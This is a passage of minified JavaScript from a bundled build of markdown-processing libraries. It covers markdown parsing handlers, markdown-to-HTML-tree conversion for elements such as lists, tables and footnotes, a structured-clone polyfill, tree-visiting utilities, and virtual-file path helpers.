t=this.stack[this.stack.length-2];t.start=Number.parseInt(this.sliceSerialize(e),10),this.data.expectingFirstListItemValue=void 0}}function p(){let e=this.resume(),t=this.stack[this.stack.length-1];t.lang=e}function m(){let e=this.resume(),t=this.stack[this.stack.length-1];t.meta=e}function h(){this.data.flowCodeInside||(this.buffer(),this.data.flowCodeInside=!0)}function g(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e.replace(/^(\r?\n|\r)|(\r?\n|\r)$/g,``),this.data.flowCodeInside=void 0}function _(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e.replace(/(\r?\n|\r)$/g,``)}function v(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.label=t,n.identifier=rg(this.sliceSerialize(e)).toLowerCase()}function y(){let e=this.resume(),t=this.stack[this.stack.length-1];t.title=e}function b(){let e=this.resume(),t=this.stack[this.stack.length-1];t.url=e}function x(e){let t=this.stack[this.stack.length-1];t.depth||=this.sliceSerialize(e).length}function S(){this.data.setextHeadingSlurpLineEnding=!0}function C(e){let t=this.stack[this.stack.length-1];t.depth=this.sliceSerialize(e).codePointAt(0)===61?1:2}function w(){this.data.setextHeadingSlurpLineEnding=void 0}function T(e){let t=this.stack[this.stack.length-1].children,n=t[t.length-1];(!n||n.type!==`text`)&&(n=ke(),n.position={start:Lv(e.start),end:void 0},t.push(n)),this.stack.push(n)}function E(e){let t=this.stack.pop();t.value+=this.sliceSerialize(e),t.position.end=Lv(e.end)}function ee(e){let n=this.stack[this.stack.length-1];if(this.data.atHardBreak){let t=n.children[n.children.length-1];t.position.end=Lv(e.end),this.data.atHardBreak=void 0;return}!this.data.setextHeadingSlurpLineEnding&&t.canContainEols.includes(n.type)&&(T.call(this,e),E.call(this,e))}function D(){this.data.atHardBreak=!0}function O(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function te(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function ne(){let e=this.resume(),t=this.stack[this.stack.length-1];t.value=e}function re(){let e=this.stack[this.stack.length-1];if(this.data.inReference){let t=this.data.referenceType||`shortcut`;e.type+=`Reference`,e.referenceType=t,delete e.url,delete e.title}else delete e.identifier,delete e.label;this.data.referenceType=void 0}function ie(){let e=this.stack[this.stack.length-1];if(this.data.inReference){let t=this.data.referenceType||`shortcut`;e.type+=`Reference`,e.referenceType=t,delete e.url,delete e.title}else delete e.identifier,delete e.label;this.data.referenceType=void 0}function ae(e){let t=this.sliceSerialize(e),n=this.stack[this.stack.length-2];n.label=Mv(t),n.identifier=rg(t).toLowerCase()}function oe(){let e=this.stack[this.stack.length-1],t=this.resume(),n=this.stack[this.stack.length-1];this.data.inReference=!0,n.type===`link`?n.children=e.children:n.alt=t}function k(){let e=this.resume(),t=this.stack[this.stack.length-1];t.url=e}function A(){let e=this.resume(),t=this.stack[this.stack.length-1];t.title=e}function se(){this.data.inReference=void 0}function ce(){this.data.referenceType=`collapsed`}function le(e){let t=this.resume(),n=this.stack[this.stack.length-1];n.label=t,n.identifier=rg(this.sliceSerialize(e)).toLowerCase(),this.data.referenceType=`full`}function ue(e){this.data.characterReferenceType=e.type}function de(e){let t=this.sliceSerialize(e),n=this.data.characterReferenceType,r;n?(r=ng(t,n===`characterReferenceMarkerNumeric`?10:16),this.data.characterReferenceType=void 0):r=Yh(t);let i=this.stack[this.stack.length-1];i.value+=r}function fe(e){let t=this.stack.pop();t.position.end=Lv(e.end)}function pe(e){E.call(this,e);let t=this.stack[this.stack.length-1];t.url=this.sliceSerialize(e)}function me(e){E.call(this,e);let t=this.stack[this.stack.length-1];t.url=`mailto:`+this.sliceSerialize(e)}function he(){return{type:`blockquote`,children:[]}}function ge(){return{type:`code`,lang:null,meta:null,value:``}}function _e(){return{type:`inlineCode`,value:``}}function ve(){return{type:`definition`,identifier:``,label:null,title:null,url:``}}function ye(){return{type:`emphasis`,children:[]}}function be(){return{type:`heading`,depth:0,children:[]}}function xe(){return{type:`break`}}function Se(){return{type:`html`,value:``}}function Ce(){return{type:`image`,title:null,url:``,alt:null}}function we(){return{type:`link`,title:null,url:``,children:[]}}function Te(e){return{type:`list`,ordered:e.type===`listOrdered`,start:null,spread:e._spread,children:[]}}function Ee(e){return{type:`listItem`,spread:e._spread,checked:null,children:[]}}function De(){return{type:`paragraph`,children:[]}}function Oe(){return{type:`strong`,children:[]}}function ke(){return{type:`text`,value:``}}function Ae(){return{type:`thematicBreak`}}}function Lv(e){return{line:e.line,column:e.column,offset:e.offset}}function Rv(e,t){let n=-1;for(;++n<t.length;){let r=t[n];Array.isArray(r)?Rv(e,r):zv(e,r)}}function zv(e,t){let n;for(n in t)if(Pv.call(t,n))switch(n){case`canContainEols`:{let r=t[n];r&&e[n].push(...r);break}case`transforms`:{let r=t[n];r&&e[n].push(...r);break}case`enter`:case`exit`:{let r=t[n];r&&Object.assign(e[n],r);break}}}function Bv(e,t){throw e?Error("Cannot close `"+e.type+"` ("+ch({start:e.start,end:e.end})+"): a different token (`"+t.type+"`, "+ch({start:t.start,end:t.end})+`) is open`):Error("Cannot close document, a token (`"+t.type+"`, "+ch({start:t.start,end:t.end})+`) is still open`)}function Vv(e){let t=this;t.parser=n;function n(n){return Fv(n,{...t.data(`settings`),...e,extensions:t.data(`micromarkExtensions`)||[],mdastExtensions:t.data(`fromMarkdownExtensions`)||[]})}}function Hv(e,t){let n={type:`element`,tagName:`blockquote`,properties:{},children:e.wrap(e.all(t),!0)};return e.patch(t,n),e.applyData(t,n)}function Uv(e,t){let n={type:`element`,tagName:`br`,properties:{},children:[]};return e.patch(t,n),[e.applyData(t,n),{type:`text`,value:`
`}]}function Wv(e,t){let n=t.value?t.value+`
`:``,r={},i=t.lang?t.lang.split(/\s+/):[];i.length>0&&(r.className=[`language-`+i[0]]);let a={type:`element`,tagName:`code`,properties:r,children:[{type:`text`,value:n}]};return t.meta&&(a.data={meta:t.meta}),e.patch(t,a),a=e.applyData(t,a),a={type:`element`,tagName:`pre`,properties:{},children:[a]},e.patch(t,a),a}function Gv(e,t){let n={type:`element`,tagName:`del`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Kv(e,t){let n={type:`element`,tagName:`em`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function qv(e,t){let n=typeof e.options.clobberPrefix==`string`?e.options.clobberPrefix:`user-content-`,r=String(t.identifier).toUpperCase(),i=hg(r.toLowerCase()),a=e.footnoteOrder.indexOf(r),o,s=e.footnoteCounts.get(r);s===void 0?(s=0,e.footnoteOrder.push(r),o=e.footnoteOrder.length):o=a+1,s+=1,e.footnoteCounts.set(r,s);let c={type:`element`,tagName:`a`,properties:{href:`#`+n+`fn-`+i,id:n+`fnref-`+i+(s>1?`-`+s:``),dataFootnoteRef:!0,ariaDescribedBy:[`footnote-label`]},children:[{type:`text`,value:String(o)}]};e.patch(t,c);let l={type:`element`,tagName:`sup`,properties:{},children:[c]};return e.patch(t,l),e.applyData(t,l)}function Jv(e,t){let n={type:`element`,tagName:`h`+t.depth,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function Yv(e,t){if(e.options.allowDangerousHtml){let n={type:`raw`,value:t.value};return e.patch(t,n),e.applyData(t,n)}}function Xv(e,t){let n=t.referenceType,r=`]`;if(n===`collapsed`?r+=`[]`:n===`full`&&(r+=`[`+(t.label||t.identifier)+`]`),t.type===`imageReference`)return[{type:`text`,value:`![`+t.alt+r}];let i=e.all(t),a=i[0];a&&a.type===`text`?a.value=`[`+a.value:i.unshift({type:`text`,value:`[`});let o=i[i.length-1];return o&&o.type===`text`?o.value+=r:i.push({type:`text`,value:r}),i}function Zv(e,t){let n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return Xv(e,t);let i={src:hg(r.url||``),alt:t.alt};r.title!==null&&r.title!==void 0&&(i.title=r.title);let a={type:`element`,tagName:`img`,properties:i,children:[]};return e.patch(t,a),e.applyData(t,a)}function Qv(e,t){let n={src:hg(t.url)};t.alt!==null&&t.alt!==void 0&&(n.alt=t.alt),t.title!==null&&t.title!==void 0&&(n.title=t.title);let r={type:`element`,tagName:`img`,properties:n,children:[]};return e.patch(t,r),e.applyData(t,r)}function $v(e,t){let n={type:`text`,value:t.value.replace(/\r?\n|\r/g,` `)};e.patch(t,n);let r={type:`element`,tagName:`code`,properties:{},children:[n]};return e.patch(t,r),e.applyData(t,r)}function ey(e,t){let n=String(t.identifier).toUpperCase(),r=e.definitionById.get(n);if(!r)return Xv(e,t);let i={href:hg(r.url||``)};r.title!==null&&r.title!==void 0&&(i.title=r.title);let a={type:`element`,tagName:`a`,properties:i,children:e.all(t)};return e.patch(t,a),e.applyData(t,a)}function ty(e,t){let n={href:hg(t.url)};t.title!==null&&t.title!==void 0&&(n.title=t.title);let r={type:`element`,tagName:`a`,properties:n,children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function ny(e,t,n){let r=e.all(t),i=n?ry(n):iy(t),a={},o=[];if(typeof t.checked==`boolean`){let e=r[0],n;e&&e.type===`element`&&e.tagName===`p`?n=e:(n={type:`element`,tagName:`p`,properties:{},children:[]},r.unshift(n)),n.children.length>0&&n.children.unshift({type:`text`,value:` `}),n.children.unshift({type:`element`,tagName:`input`,properties:{type:`checkbox`,checked:t.checked,disabled:!0},children:[]}),a.className=[`task-list-item`]}let s=-1;for(;++s<r.length;){let e=r[s];(i||s!==0||e.type!==`element`||e.tagName!==`p`)&&o.push({type:`text`,value:`
`}),e.type===`element`&&e.tagName===`p`&&!i?o.push(...e.children):o.push(e)}let c=r[r.length-1];c&&(i||c.type!==`element`||c.tagName!==`p`)&&o.push({type:`text`,value:`
`});let l={type:`element`,tagName:`li`,properties:a,children:o};return e.patch(t,l),e.applyData(t,l)}function ry(e){let t=!1;if(e.type===`list`){t=e.spread||!1;let n=e.children,r=-1;for(;!t&&++r<n.length;)t=iy(n[r])}return t}function iy(e){return e.spread??e.children.length>1}function ay(e,t){let n={},r=e.all(t),i=-1;for(typeof t.start==`number`&&t.start!==1&&(n.start=t.start);++i<r.length;){let e=r[i];if(e.type===`element`&&e.tagName===`li`&&e.properties&&Array.isArray(e.properties.className)&&e.properties.className.includes(`task-list-item`)){n.className=[`contains-task-list`];break}}let a={type:`element`,tagName:t.ordered?`ol`:`ul`,properties:n,children:e.wrap(r,!0)};return e.patch(t,a),e.applyData(t,a)}function oy(e,t){let n={type:`element`,tagName:`p`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function sy(e,t){let n={type:`root`,children:e.wrap(e.all(t))};return e.patch(t,n),e.applyData(t,n)}function cy(e,t){let n={type:`element`,tagName:`strong`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}function ly(e,t){let n=e.all(t),r=n.shift(),i=[];if(r){let n={type:`element`,tagName:`thead`,properties:{},children:e.wrap([r],!0)};e.patch(t.children[0],n),i.push(n)}if(n.length>0){let r={type:`element`,tagName:`tbody`,properties:{},children:e.wrap(n,!0)},a=ah(t.children[1]),o=ih(t.children[t.children.length-1]);a&&o&&(r.position={start:a,end:o}),i.push(r)}let a={type:`element`,tagName:`table`,properties:{},children:e.wrap(i,!0)};return e.patch(t,a),e.applyData(t,a)}function uy(e,t,n){let r=n?n.children:void 0,i=(r?r.indexOf(t):1)===0?`th`:`td`,a=n&&n.type===`table`?n.align:void 0,o=a?a.length:t.children.length,s=-1,c=[];for(;++s<o;){let n=t.children[s],r={},o=a?a[s]:void 0;o&&(r.align=o);let l={type:`element`,tagName:i,properties:r,children:[]};n&&(l.children=e.all(n),e.patch(n,l),l=e.applyData(n,l)),c.push(l)}let l={type:`element`,tagName:`tr`,properties:{},children:e.wrap(c,!0)};return e.patch(t,l),e.applyData(t,l)}function dy(e,t){let n={type:`element`,tagName:`td`,properties:{},children:e.all(t)};return e.patch(t,n),e.applyData(t,n)}var fy=9,py=32;function my(e){let t=String(e),n=/\r?\n|\r/g,r=n.exec(t),i=0,a=[];for(;r;)a.push(hy(t.slice(i,r.index),i>0,!0),r[0]),i=r.index+r[0].length,r=n.exec(t);return a.push(hy(t.slice(i),i>0,!1)),a.join(``)}function hy(e,t,n){let r=0,i=e.length;if(t){let t=e.codePointAt(r);for(;t===fy||t===py;)r++,t=e.codePointAt(r)}if(n){let t=e.codePointAt(i-1);for(;t===fy||t===py;)i--,t=e.codePointAt(i-1)}return i>r?e.slice(r,i):``}function gy(e,t){let n={type:`text`,value:my(String(t.value))};return e.patch(t,n),e.applyData(t,n)}function _y(e,t){let n={type:`element`,tagName:`hr`,properties:{},children:[]};return e.patch(t,n),e.applyData(t,n)}var vy={blockquote:Hv,break:Uv,code:Wv,delete:Gv,emphasis:Kv,footnoteReference:qv,heading:Jv,html:Yv,imageReference:Zv,image:Qv,inlineCode:$v,linkReference:ey,link:ty,listItem:ny,list:ay,paragraph:oy,root:sy,strong:cy,table:ly,tableCell:dy,tableRow:uy,text:gy,thematicBreak:_y,toml:yy,yaml:yy,definition:yy,footnoteDefinition:yy};function yy(){}var by=typeof self==`object`?self:globalThis,xy=(e,t)=>{let n=(t,n)=>(e.set(n,t),t),r=i=>{if(e.has(i))return e.get(i);let[a,o]=t[i];switch(a){case 0:case-1:return n(o,i);case 1:{let e=n([],i);for(let t of o)e.push(r(t));return e}case 2:{let e=n({},i);for(let[t,n]of o)e[r(t)]=r(n);return e}case 3:return n(new Date(o),i);case 4:{let{source:e,flags:t}=o;return n(new RegExp(e,t),i)}case 5:{let e=n(new Map,i);for(let[t,n]of o)e.set(r(t),r(n));return e}case 6:{let e=n(new Set,i);for(let t of o)e.add(r(t));return e}case 7:{let{name:e,message:t}=o;return n(new by[e](t),i)}case 8:return n(BigInt(o),i);case`BigInt`:return n(Object(BigInt(o)),i);case`ArrayBuffer`:return n(new Uint8Array(o).buffer,o);case`DataView`:{let{buffer:e}=new Uint8Array(o);return n(new DataView(e),o)}}return n(new by[a](o),i)};return r},Sy=e=>xy(new Map,e)(0),Cy=``,{toString:wy}={},{keys:Ty}=Object,Ey=e=>{let t=typeof e;if(t!==`object`||!e)return[0,t];let n=wy.call(e).slice(8,-1);switch(n){case`Array`:return[1,Cy];case`Object`:return[2,Cy];case`Date`:return[3,Cy];case`RegExp`:return[4,Cy];case`Map`:return[5,Cy];case`Set`:return[6,Cy];case`DataView`:return[1,n]}return n.includes(`Array`)?[1,n]:n.includes(`Error`)?[7,n]:[2,n]},Dy=([e,t])=>e===0&&(t===`function`||t===`symbol`),Oy=(e,t,n,r)=>{let i=(e,t)=>{let i=r.push(e)-1;return n.set(t,i),i},a=r=>{if(n.has(r))return n.get(r);let[o,s]=Ey(r);switch(o){case 0:{let t=r;switch(s){case`bigint`:o=8,t=r.toString();break;case`function`:case`symbol`:if(e)throw TypeError(`unable to serialize `+s);t=null;break;case`undefined`:return i([-1],r)}return i([o,t],r)}case 1:{if(s){let e=r;return s===`DataView`?e=new Uint8Array(r.buffer):s===`ArrayBuffer`&&(e=new Uint8Array(r)),i([s,[...e]],r)}let e=[],t=i([o,e],r);for(let t of r)e.push(a(t));return t}case 2:{if(s)switch(s){case`BigInt`:return i([s,r.toString()],r);case`Boolean`:case`Number`:case`String`:return i([s,r.valueOf()],r)}if(t&&`toJSON`in r)return a(r.toJSON());let n=[],c=i([o,n],r);for(let t of Ty(r))(e||!Dy(Ey(r[t])))&&n.push([a(t),a(r[t])]);return c}case 3:return i([o,r.toISOString()],r);case 4:{let{source:e,flags:t}=r;return i([o,{source:e,flags:t}],r)}case 5:{let t=[],n=i([o,t],r);for(let[n,i]of r)(e||!(Dy(Ey(n))||Dy(Ey(i))))&&t.push([a(n),a(i)]);return n}case 6:{let t=[],n=i([o,t],r);for(let n of r)(e||!Dy(Ey(n)))&&t.push(a(n));return n}}let{message:c}=r;return i([o,{name:s,message:c}],r)};return a},ky=(e,{json:t,lossy:n}={})=>{let r=[];return Oy(!(t||n),!!t,new Map,r)(e),r},Ay=typeof structuredClone==`function`?(e,t)=>t&&(`json`in t||`lossy`in t)?Sy(ky(e,t)):structuredClone(e):(e,t)=>Sy(ky(e,t));function jy(e,t){let n=[{type:`text`,value:`↩`}];return t>1&&n.push({type:`element`,tagName:`sup`,properties:{},children:[{type:`text`,value:String(t)}]}),n}function My(e,t){return`Back to reference `+(e+1)+(t>1?`-`+t:``)}function Ny(e){let t=typeof e.options.clobberPrefix==`string`?e.options.clobberPrefix:`user-content-`,n=e.options.footnoteBackContent||jy,r=e.options.footnoteBackLabel||My,i=e.options.footnoteLabel||`Footnotes`,a=e.options.footnoteLabelTagName||`h2`,o=e.options.footnoteLabelProperties||{className:[`sr-only`]},s=[],c=-1;for(;++c<e.footnoteOrder.length;){let i=e.footnoteById.get(e.footnoteOrder[c]);if(!i)continue;let a=e.all(i),o=String(i.identifier).toUpperCase(),l=hg(o.toLowerCase()),u=0,d=[],f=e.footnoteCounts.get(o);for(;f!==void 0&&++u<=f;){d.length>0&&d.push({type:`text`,value:` `});let e=typeof n==`string`?n:n(c,u);typeof e==`string`&&(e={type:`text`,value:e}),d.push({type:`element`,tagName:`a`,properties:{href:`#`+t+`fnref-`+l+(u>1?`-`+u:``),dataFootnoteBackref:``,ariaLabel:typeof r==`string`?r:r(c,u),className:[`data-footnote-backref`]},children:Array.isArray(e)?e:[e]})}let p=a[a.length-1];if(p&&p.type===`element`&&p.tagName===`p`){let e=p.children[p.children.length-1];e&&e.type===`text`?e.value+=` `:p.children.push({type:`text`,value:` `}),p.children.push(...d)}else a.push(...d);let m={type:`element`,tagName:`li`,properties:{id:t+`fn-`+l},children:e.wrap(a,!0)};e.patch(i,m),s.push(m)}if(s.length!==0)return{type:`element`,tagName:`section`,properties:{dataFootnotes:!0,className:[`footnotes`]},children:[{type:`element`,tagName:a,properties:{...Ay(o),id:`footnote-label`},children:[{type:`text`,value:i}]},{type:`text`,value:`
`},{type:`element`,tagName:`ol`,properties:{},children:e.wrap(s,!0)},{type:`text`,value:`
`}]}}var Py=(function(e){if(e==null)return zy;if(typeof e==`function`)return Ry(e);if(typeof e==`object`)return Array.isArray(e)?Fy(e):Iy(e);if(typeof e==`string`)return Ly(e);throw Error(`Expected function, string, or object as test`)});function Fy(e){let t=[],n=-1;for(;++n<e.length;)t[n]=Py(e[n]);return Ry(r);function r(...e){let n=-1;for(;++n<t.length;)if(t[n].apply(this,e))return!0;return!1}}function Iy(e){let t=e;return Ry(n);function n(n){let r=n,i;for(i in e)if(r[i]!==t[i])return!1;return!0}}function Ly(e){return Ry(t);function t(t){return t&&t.type===e}}function Ry(e){return t;function t(t,n,r){return!!(By(t)&&e.call(this,t,typeof n==`number`?n:void 0,r||void 0))}}function zy(){return!0}function By(e){return typeof e==`object`&&!!e&&`type`in e}function Vy(e){return e}var Hy=[];function Uy(e,t,n,r){let i;typeof t==`function`&&typeof n!=`function`?(r=n,n=t):i=t;let a=Py(i),o=r?-1:1;s(e,void 0,[])();function s(e,i,c){let l=e&&typeof e==`object`?e:{};if(typeof l.type==`string`){let t=typeof l.tagName==`string`?l.tagName:typeof l.name==`string`?l.name:void 0;Object.defineProperty(u,`name`,{value:`node (`+Vy(e.type+(t?`<`+t+`>`:``))+`)`})}return u;function u(){let l=Hy,u,d,f;if((!t||a(e,i,c[c.length-1]||void 0))&&(l=Wy(n(e,c)),l[0]===!1))return l;if(`children`in e&&e.children){let t=e;if(t.children&&l[0]!==`skip`)for(d=(r?t.children.length:-1)+o,f=c.concat(t);d>-1&&d<t.children.length;){let e=t.children[d];if(u=s(e,d,f)(),u[0]===!1)return u;d=typeof u[1]==`number`?u[1]:d+o}}return l}}}function Wy(e){return Array.isArray(e)?e:typeof e==`number`?[!0,e]:e==null?Hy:[e]}function Gy(e,t,n,r){let i,a,o;typeof t==`function`&&typeof n!=`function`?(a=void 0,o=t,i=n):(a=t,o=n,i=r),Uy(e,a,s,i);function s(e,t){let n=t[t.length-1],r=n?n.children.indexOf(e):void 0;return o(e,r,n)}}var Ky={}.hasOwnProperty,qy={};function Jy(e,t){let n=t||qy,r=new Map,i=new Map,a={all:s,applyData:Xy,definitionById:r,footnoteById:i,footnoteCounts:new Map,footnoteOrder:[],handlers:{...vy,...n.handlers},one:o,options:n,patch:Yy,wrap:Qy};return Gy(e,function(e){if(e.type===`definition`||e.type===`footnoteDefinition`){let t=e.type===`definition`?r:i,n=String(e.identifier).toUpperCase();t.has(n)||t.set(n,e)}}),a;function o(e,t){let n=e.type,r=a.handlers[n];if(Ky.call(a.handlers,n)&&r)return r(a,e,t);if(a.options.passThrough&&a.options.passThrough.includes(n)){if(`children`in e){let{children:t,...n}=e,r=Ay(n);return r.children=a.all(e),r}return Ay(e)}return(a.options.unknownHandler||Zy)(a,e,t)}function s(e){let t=[];if(`children`in e){let n=e.children,r=-1;for(;++r<n.length;){let i=a.one(n[r],e);if(i){if(r&&n[r-1].type===`break`&&(!Array.isArray(i)&&i.type===`text`&&(i.value=$y(i.value)),!Array.isArray(i)&&i.type===`element`)){let e=i.children[0];e&&e.type===`text`&&(e.value=$y(e.value))}Array.isArray(i)?t.push(...i):t.push(i)}}}return t}}function Yy(e,t){e.position&&(t.position=sh(e))}function Xy(e,t){let n=t;if(e&&e.data){let t=e.data.hName,r=e.data.hChildren,i=e.data.hProperties;typeof t==`string`&&(n.type===`element`?n.tagName=t:n={type:`element`,tagName:t,properties:{},children:`children`in n?n.children:[n]}),n.type===`element`&&i&&Object.assign(n.properties,Ay(i)),`children`in n&&n.children&&r!=null&&(n.children=r)}return n}function Zy(e,t){let n=t.data||{},r=`value`in t&&!(Ky.call(n,`hProperties`)||Ky.call(n,`hChildren`))?{type:`text`,value:t.value}:{type:`element`,tagName:`div`,properties:{},children:e.all(t)};return e.patch(t,r),e.applyData(t,r)}function Qy(e,t){let n=[],r=-1;for(t&&n.push({type:`text`,value:`
`});++r<e.length;)r&&n.push({type:`text`,value:`
`}),n.push(e[r]);return t&&e.length>0&&n.push({type:`text`,value:`
`}),n}function $y(e){let t=0,n=e.charCodeAt(t);for(;n===9||n===32;)t++,n=e.charCodeAt(t);return e.slice(t)}function eb(e,t){let n=Jy(e,t),r=n.one(e,void 0),i=Ny(n),a=Array.isArray(r)?{type:`root`,children:r}:r||{type:`root`,children:[]};return i&&(`children`in a,a.children.push({type:`text`,value:`
`},i)),a}function tb(e,t){return e&&`run`in e?async function(n,r){let i=eb(n,{file:r,...t});await e.run(i,r)}:function(n,r){return eb(n,{file:r,...e||t})}}function nb(e){if(e)throw e}var rb=s(((e,t)=>{var n=Object.prototype.hasOwnProperty,r=Object.prototype.toString,i=Object.defineProperty,a=Object.getOwnPropertyDescriptor,o=function(e){return typeof Array.isArray==`function`?Array.isArray(e):r.call(e)===`[object Array]`},s=function(e){if(!e||r.call(e)!==`[object Object]`)return!1;var t=n.call(e,`constructor`),i=e.constructor&&e.constructor.prototype&&n.call(e.constructor.prototype,`isPrototypeOf`);if(e.constructor&&!t&&!i)return!1;for(var a in e);return a===void 0||n.call(e,a)},c=function(e,t){i&&t.name===`__proto__`?i(e,t.name,{enumerable:!0,configurable:!0,value:t.newValue,writable:!0}):e[t.name]=t.newValue},l=function(e,t){if(t===`__proto__`){if(!n.call(e,t))return;if(a)return a(e,t).value}return e[t]};t.exports=function e(){var t,n,r,i,a,u,d=arguments[0],f=1,p=arguments.length,m=!1;for(typeof d==`boolean`&&(m=d,d=arguments[1]||{},f=2),(d==null||typeof d!=`object`&&typeof d!=`function`)&&(d={});f<p;++f)if(t=arguments[f],t!=null)for(n in t)r=l(d,n),i=l(t,n),d!==i&&(m&&i&&(s(i)||(a=o(i)))?(a?(a=!1,u=r&&o(r)?r:[]):u=r&&s(r)?r:{},c(d,{name:n,newValue:e(m,u,i)})):i!==void 0&&c(d,{name:n,newValue:i}));return d}}));function ib(e){if(typeof e!=`object`||!e)return!1;let t=Object.getPrototypeOf(e);return(t===null||t===Object.prototype||Object.getPrototypeOf(t)===null)&&!(Symbol.toStringTag in e)&&!(Symbol.iterator in e)}function ab(){let e=[],t={run:n,use:r};return t;function n(...t){let n=-1,r=t.pop();if(typeof r!=`function`)throw TypeError(`Expected function as last argument, not `+r);i(null,...t);function i(a,...o){let s=e[++n],c=-1;if(a){r(a);return}for(;++c<t.length;)(o[c]===null||o[c]===void 0)&&(o[c]=t[c]);t=o,s?ob(s,i)(...o):r(null,...o)}}function r(n){if(typeof n!=`function`)throw TypeError("Expected `middelware` to be a function, not "+n);return e.push(n),t}}function ob(e,t){let n;return r;function r(...t){let r=e.length>t.length,o;r&&t.push(i);try{o=e.apply(this,t)}catch(e){let t=e;if(r&&n)throw t;return i(t)}r||(o&&o.then&&typeof o.then==`function`?o.then(a,i):o instanceof Error?i(o):a(o))}function i(e,...r){n||(n=!0,t(e,...r))}function a(e){i(null,e)}}var sb={basename:cb,dirname:lb,extname:ub,join:db,sep:`/`};function cb(e,t){if(t!==void 0&&typeof t!=`string`)throw TypeError(`"ext" argument must be a string`);mb(e);let n=0,r=-1,i=e.length,a;if(t===void 0||t.length===0||t.length>e.length){for(;i--;)if(e.codePointAt(i)===47){if(a){n=i+1;break}}else r<0&&(a=!0,r=i+1);return r<0?``:e.slice(n,r)}if(t===e)return``;let o=-1,s=t.length-1;for(;i--;)if(e.codePointAt(i)===47){if(a){n=i+1;break}}else o<0&&(a=!0,o=i+1),s>-1&&(e.codePointAt(i)===t.codePointAt(s--)?s<0&&(r=i):(s=-1,r=o));return n===r?r=o:r<0&&(r=e.length),e.slice(n,r)}function lb(e){if(mb(e),e.length===0)return`.`;let t=-1,n=e.length,r;for(;--n;)if(e.codePointAt(n)===47){if(r){t=n;break}}else r||=!0;return t<0?e.codePointAt(0)===47?`/`:`.`:t===1&&e.codePointAt(0)===47?`//`:e.slice(0,t)}function ub(e){mb(e);let t=e.length,n=-1,r=0,i=-1,a=0,o;for(;t--;){let s=e.codePointAt(t);if(s===47){if(o){r=t+1;break}continue}n<0&&(o=!0,n=t+1),s===46?i<0?i=t:a!==1&&(a=1):i>-1&&(a=-1)}return i<0||n<0||a===0||a===1&&i===n-1&&i===r+1?``:e.slice(i,n)}function db(...e){let t=-1,n;for(;++t<e.length;)mb(e[t]),e[t]&&(n=n===void 0?e[t]:n+`/`+e[t]);return n===void 0?`.`:fb(n)}function fb(e){mb(e);let t=e.codePointAt(0)===47,n=pb(e,!t);return n.length===0&&!t&&(n=`.`),n.length>0&&e.codePointAt(e.length-1)===47&&(n+=`/`),t?`/`+n:n}function pb(e,t){let n=``,r=0,i=-1,a=0,o=-1,s,c;for(;++o<=e.length;){if(o<e.length)s=e.codePointAt(o);else if(s===47)break;else s=47;if(s===47){if(!(i===o-1||a===1))if(i!==o-1&&a===2){if(n.length<2||r!==2||n.codePointAt(n.length-1)!==46||n.codePointAt(n.length-2)!==46){if(n.length>2){if(c=n.lastIndexOf(`/`),c!==n.length-1){c<0?(n=``,r=0):(n=n.slice(0,c),r=n.length-1-n.lastIndexOf(`/`)),i=o,a=0;continue}}else if(n.length>0){n=``,r=0,i=o,a=0;continue}}t&&(n=n.length>0?n+`/..`:`..`,r=2)}else n.length>0?n+=`/`+e.slice(i+1,o):n=e.slice(i+1,o),r=o-i-1;i=o,a=0}else s===46&&a>-1?a++:a=-1}return n}function mb(e){if(typeof e!=`string`)throw TypeError(`Path must be a string. Received `+JSON.stringify(e))}var hb={cwd:gb};function gb(){return`/`}function _b(e){return!!(typeof e==`object`&&e&&`href`in e&&e.href&&`protocol`in e&&e.protocol&&e.auth===void 0)}function vb(e){if(typeof e==`string`)e=new URL(e);else if(!_b(e)){let t=TypeError('The "path" argument must be of type string or an instance of URL. Received `'+e+"`");throw t.code=`ERR_INVALID_ARG_TYPE`,t}if(e.protocol!==`file:`){let e=TypeError(`The URL must be of scheme file`);throw e.code=`ERR_INVALID_URL_SCHEME`,e}return yb(e)}function yb(e){if(e.hostname!==``){let e=TypeError(`File URL host must be "localhost" or empty on darwin`);throw e.code=`ERR_INVALID_FILE_URL_HOST`,e}let t=e.pathname,n=-1;for(;++n<t.length;)if(t.codePointAt(n)===37&&t.codePointAt(n+1)===50){let e=t.codePointAt(n+2);if(e===70||e===102){let e=TypeError(`File URL path must not include encoded / characters`);throw e.code=`ERR_INVALID_FILE_URL_PATH`,e}}return decodeURIComponent(t)}var bb=[`history`,`path`,`basename`,`stem`,`extname`,`dirname`],xb=class{constructor(e){let t;t=e?_b(e)?{path:e}:typeof e==`string`||Tb(e)?{value:e}:e:{},this.cwd=`cwd`in t?``:hb.cwd(),this.data={},this.history=[],this.messages=[],this.value,this.map,this.result,this.stored;let n=-1;for(;++n<bb.length;){let e=bb[n];e in t&&t[e]!==void 0&&t[e]!==null&&(this[e]=e===`history`?[...t[e]]:t[e])}let r;for(r in t)bb.includes(r)||(this[r]=t[r])}get basename(){return typeof this.path==`string`?sb.basename(this.path):void 0}set basename(e){Cb(e,`basename`),Sb(e,`basename`),this.path=sb.join(this.dirname||``,e)}get dirname(){return typeof this.path==`string`?sb.dirname(this.path):void 0}set dirname(e){wb(this.basename,`dirname`),this.path=sb.join(e||``,this.basename)}get extname(){return typeof this.path==`string`?sb.extname(this.path):void 0}set extname(e){if(Sb(e,`extname`),wb(this.dirname,`extname`),e){if(e.codePointAt(0)!==46)throw Error("`extname` must start with `.`");if(e.includes(`.`,1))throw Error("`extname` cannot contain multiple dots")}this.path=sb.join(this.dirname,this.stem+(e||``))}get path(){return this.history[this.history.length-1]}set path(e){_b(e)&&(e=vb(e)),Cb(e,`path`),this.path!==e&&this.history.push(e)}get stem(){return typeof this.path==`string`?sb.basename(this.path,this.extname):void 0}set stem(e){Cb(e,`stem`),Sb(e,`stem`),this.path=sb.join(this.dirname||``,e+(this.extname||``))}fail(e,t,n){let 